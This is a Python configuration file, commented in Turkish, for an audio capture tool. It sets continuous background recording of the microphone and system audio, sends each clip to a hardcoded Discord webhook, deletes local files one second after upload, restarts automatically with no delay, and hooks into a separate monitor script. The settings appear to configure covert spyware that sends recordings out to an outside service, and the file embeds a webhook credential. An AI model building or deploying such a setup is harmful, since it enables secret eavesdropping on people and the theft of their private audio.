"""
Ses kayıt sistemi için konfigürasyon ayarları.
Bu dosyayı düzenleyerek ses kaydı davranışını özelleştirebilirsiniz.
"""

# Kayıt ayarları
DEFAULT_RECORDING_DURATION = 30  # Saniye cinsinden kayıt süresi (60'dan 30'a düşürüldü)
SAMPLE_RATE = 22050             # Örnek hızı (düşük değer = küçük dosya boyutu)
MP3_BITRATE = 32                # MP3 bit hızı (düşük değer = küçük dosya boyutu)
BIT_DEPTH = 16                  # WAV dosyaları için bit derinliği (16 veya 24)
COMPRESS_AUDIO = True           # Ses kayıtları MP3'e sıkıştırılsın mı?

# Çalışma davranışı ayarları
CONTINUOUS_MODE = True          # Hız beklemeden sürekli kayıt modu
SEND_IN_BACKGROUND = True       # Dosyaları arka planda gönder
CLEANUP_DELAY = 1               # Başarılı gönderdikten sonra dosyayı silmeden önce beklenecek saniye

# Discord'a gönderme ayarları
SEND_MIXED_AUDIO = True        # Karışık ses kaydını gönder (mikrofon + sistem)
SEND_MIC_AUDIO = False          # Sadece mikrofon kaydını gönder
SEND_SYSTEM_AUDIO = False        # Sadece sistem ses kaydını gönder

# Discord webhook URL'leri
AUDIO_WEBHOOK_URL = "https://discord.com/api/webhooks/1345212795515568138/_Owji5OJk2p9MzNX3gaIZJ5wZfItA3NTllHW16ee5g9zzEv7wK2E76vlFE3qbOITwRIs"

# Yeniden başlatma ve yeniden deneme ayarları
MAX_RESTART_ATTEMPTS = 25       # Maksimum yeniden başlatma sayısı
RESTART_DELAY = 0               # Yeniden başlatma arasındaki bekleme süresi (saniye) - 0 olarak değiştirildi!
MAX_DISCORD_RETRIES = 5         # Discord'a gönderme deneme sayısı
DISCORD_RETRY_DELAY = 10        # Discord denemeler arasındaki bekleme süresi

# Sistem ayarları
FFMPEG_AUTO_DOWNLOAD = True     # FFmpeg bulunamazsa otomatik indirmeyi dene
CLEANUP_OLD_FILES = True        # Eski ses dosyalarını otomatik olarak temizle
CLEANUP_AGE_HOURS = 2           # Bu saatten eski dosyaları temizle (2 saat = 7200 saniye)

# Ses ayarları
MIC_BOOST = 1.5                 # Mikrofon ses yüksekliği çarpanı (5.0'dan 1.5'e düşürüldü)
SYSTEM_AUDIO_VOLUME = 2.0       # Sistem ses yüksekliği çarpanı (0.5'den 2.0'ye artırıldı)
NORMALIZE_AUDIO = True          # Ses seviyelerini otomatik olarak normalleştir

# Ses kaydı hatalarından kurtulma
ERROR_TOLERANCE = 10            # Ardışık hata sayısı limitini aşınca yeniden başlat
ERROR_COOLDOWN = 0             # Hatalar arasında bekleme süresi (saniye)
SUCCESS_WAIT_TIME = 10          # Başarılı bir kayıttan sonra bekleme süresi (saniye)

# Debug modunu etkinleştir/devre dışı bırak
DEBUG = True                    # Sorun giderme için ek bilgiler ve dosyalar oluşturulsun mu?
TEST_MODE_DURATION = 10         # Test modunda kayıt süresi (saniye)

# Discord mesaj ayarları
SEND_STARTUP_NOTIFICATION = True  # Başlangıçta Discord'a bildirim gönder
SEND_ERROR_NOTIFICATION = True    # Hatalardan sonra Discord'a bildirim gönder

# Ses cihazı ayarları
USE_DISCORD_DEVICES = True      # Discord ses cihazlarını kullanmayı dene
ALTERNATIVE_MIC_KEYWORDS = [    # Alternatif mikrofon cihazlarını bulmak için anahtar kelimeler - genişletildi
    "mikrofon", "microphone", "headset", "input", "mic", "recording", "mikro", "yaka", 
    "realtek", "voice", "ses", "sound", "audio", "microfono", "entry"
]
ALTERNATIVE_SPEAKER_KEYWORDS = [ # Alternatif hoparlör cihazlarını bulmak için anahtar kelimeler
    "hoparlor", "speaker", "output", "headphones", "playback", "stereo mix", "what u hear", "loopback"
]

# Monitor.py ile entegrasyon ayarları
AUDIO_RECORDING_ENABLED = True   # Ses kaydı özelliğini etkinleştir/devre dışı bırak
AUDIO_PROCESS_RESTART_LIMIT = 10 # Ses kaydı işlemi başarısız olunca kaç kez yeniden başlatılacak
AUDIO_PROCESS_RESTART_DELAY = 5  # Ses kaydı işlemi yeniden başlatma arasındaki bekleme süresi
